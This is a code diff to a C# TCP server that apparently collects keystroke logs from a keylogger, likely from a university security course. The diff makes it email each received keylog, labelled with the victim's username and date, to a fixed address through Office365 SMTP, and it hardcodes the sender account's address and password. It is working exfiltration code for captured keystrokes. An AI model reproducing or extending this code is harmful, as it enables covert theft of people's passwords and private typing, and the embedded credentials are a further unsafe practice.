@@ -8,7 +8,7 @@ namespace Networking
 {
     class TCPServer
     {
-        private const string FROM_EMAIL_ADDRESS = "cmsc414dummy@yahoo.com";
+        private const string FROM_EMAIL_ADDRESS = "cmsc414dummy@outlook.com";
         private const string FROM_EMAIL_PASSWORD = "414dummy";
         private const string TO_EMAIL_ADDRESS = "smithcl6@vcu.edu";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
@@ -32,7 +32,7 @@ namespace Networking
                 int bytesRead = stream.Read(buffer, 0, buffer.Length);
                 string log = System.Text.Encoding.ASCII.GetString(buffer, 0, bytesRead);
                 Console.WriteLine("Message Received:" + log);
-                // sendMail();
+                sendMail(log);
                 
                 StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                 output.Write(log);
@@ -71,7 +71,7 @@ namespace Networking
         }
 
         // Sends email based off incoming keylogs to the specified email address
-        public static void sendMail()
+        public static void sendMail(string log)
         {
             try
             {
@@ -79,10 +79,9 @@ namespace Networking
                 // StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                 // string emailBody = input.ReadToEnd();
                 // input.Close();
-                string emailBody = "Testing out SMTP";
 
                 // Create the email client object
-                SmtpClient client = new SmtpClient("smtp.mail.yahoo.com")
+                SmtpClient client = new SmtpClient("smtp.office365.com")
                 {
                     Port = 587,
                     DeliveryMethod = SmtpDeliveryMethod.Network,
@@ -96,7 +95,7 @@ namespace Networking
                 {
                     From = new MailAddress(FROM_EMAIL_ADDRESS),
                     Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
-                    Body = emailBody,
+                    Body = log,
                     IsBodyHtml = false,
                 };
 
